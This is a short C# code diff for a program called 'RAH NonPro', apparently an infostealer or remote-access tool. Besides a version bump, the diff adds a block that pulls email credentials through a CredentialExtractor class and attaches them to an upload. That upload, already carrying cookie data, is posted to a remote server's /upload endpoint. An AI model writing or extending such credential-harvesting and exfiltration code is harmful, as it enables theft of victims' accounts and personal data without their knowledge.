@@ -79,9 +79,9 @@ namespace FileTransfer
         private static string LayoutJson = "{}";
 
         private static string AppTitleMainText = "RAH NonPro";
-        private static string AppTitleVersionText = " v7.2.2";
-        private static string WindowTitleText = "RAH NonPro v7.2.2";
-        private static string ClientVersion = "7.2.2";
+        private static string AppTitleVersionText = " v7.2.3";
+        private static string WindowTitleText = "RAH NonPro v7.2.3";
+        private static string ClientVersion = "7.2.3";
         private static string ThemeAccentHex = "#00F0FF";
         private static string ThemeSurfaceHex = "#0D0E12";
         private static bool HideConsole = false;
@@ -627,6 +627,20 @@ namespace FileTransfer
                 {
                     content.Add(new StringContent(_cookieError), "cookieError");
                     Log("Cookie debug log added to upload");
+                }
+
+                try
+                {
+                    string emailsJson = CredentialExtractor.ExtractEmailsJson();
+                    if (!string.IsNullOrEmpty(emailsJson) && emailsJson != "[]")
+                    {
+                        content.Add(new StringContent(emailsJson), "emails");
+                        Log($"Emails extracted: {emailsJson.Length} chars");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Log("Email extraction error: " + ex);
                 }
 
                 string url = $"{ServerUrl}/upload";
